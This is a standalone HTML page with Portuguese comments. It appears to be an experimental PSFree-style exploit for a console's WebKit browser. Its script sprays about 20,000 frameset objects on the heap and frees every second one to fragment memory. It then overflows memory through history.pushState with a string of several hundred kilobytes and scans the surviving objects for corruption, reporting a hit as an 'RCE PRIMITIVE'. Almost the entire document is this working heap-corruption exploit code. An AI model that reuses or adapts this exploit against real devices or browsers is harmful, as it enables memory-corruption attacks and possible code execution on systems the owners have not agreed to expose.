<!DOCTYPE html>
<html>
<head>
    <title>PSFree Classic Spray</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white;}
    </style>
</head>
<body>

    <h1>PSFree Classic Spray (Small Objects)</h1>
    <p>Usando valores originais do PSFree (0x50) e spray massivo.</p>

    <button onclick="startClassicSpray()">INICIAR SPRAY CLÁSSICO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 340; // 340KB de excesso (Cobre milhares de objetos pequenos)

        // --- VALORES DO PSFREE ---
        // Para FW 9.00+ (e provavelmente 12.00), o ssv_len é 0x50
        const SSV_LEN = 0x50; 
        
        // Fórmula exata do psfree.mjs (Linha 129):
        // const rows = ",".repeat(ssv_len / 8 - 2);
        // 0x50 (80) / 8 = 10. 10 - 2 = 8 vírgulas.
        const ROWS_STRING = ",".repeat((SSV_LEN / 8) - 2);

        // Quantidade massiva para cobrir a área do overflow
        // Se cada objeto tem 80 bytes, 20.000 objetos = 1.6 MB
        const SPRAY_COUNT = 20000; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startClassicSpray() {
            log(`1. Alocando ${SPRAY_COUNT} Framesets Pequenos (Size: ${SSV_LEN})...`);
            log(`String Rows: "${ROWS_STRING}"`);

            // FASE 1: SPRAY MASSIVO (Tapete de objetos)
            // Isso enche o fastMalloc com milhares de pequenos framesets
            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = ROWS_STRING;
                    victims.push(fset);
                }
            } catch(e) {
                log("Erro de memória durante spray: " + e.message);
                return;
            }

            // FASE 2: QUEIJO SUÍÇO (Buracos)
            log("2. Criando buracos (1 a cada 2)...");
            // Apagamos metade para criar fragmentação no fastMalloc
            // A esperança é que o cabeçalho da nossa string gigante caia perto de um desses buracos
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i].rows = ""; 
                victims[i] = null;
            }

            await forceGC();

            // FASE 3: EXPLOIT
            log("3. Disparando Overflow (Passando o trator)...");

            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "psfree_classic", "/" + buffer);

                    log("4. Verificando as vítimas sobreviventes...");
                    checkCorruption();

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function checkCorruption() {
            let found = false;

            // Checa os framesets sobreviventes
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                let val = fset.rows;
                
                // A string original tem tamanho 8 (8 vírgulas)
                // Se o tamanho mudar, BINGO.
                if (val.length !== ROWS_STRING.length) {
                    log(`!!! JACKPOT !!! Frameset ${i} atingido!`, 'win');
                    log(`Tamanho Original: ${ROWS_STRING.length}`);
                    log(`Novo Tamanho: ${val.length}`);
                    alert("RCE PRIMITIVE: FRAMESET (PSFREE METHOD)!");
                    found = true;
                    break;
                }

                // Checa conteúdo por 0x01 (16843009)
                if (val.indexOf("16843009") !== -1) {
                    log(`!!! JACKPOT !!! Dados 0x01 encontrados no Frameset ${i}`, 'win');
                    found = true;
                    break;
                }
            }

            if(!found) {
                log("Nenhum frameset atingido.");
                log("Diagnóstico: O overflow (Large Heap) passou longe do fastMalloc.");
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
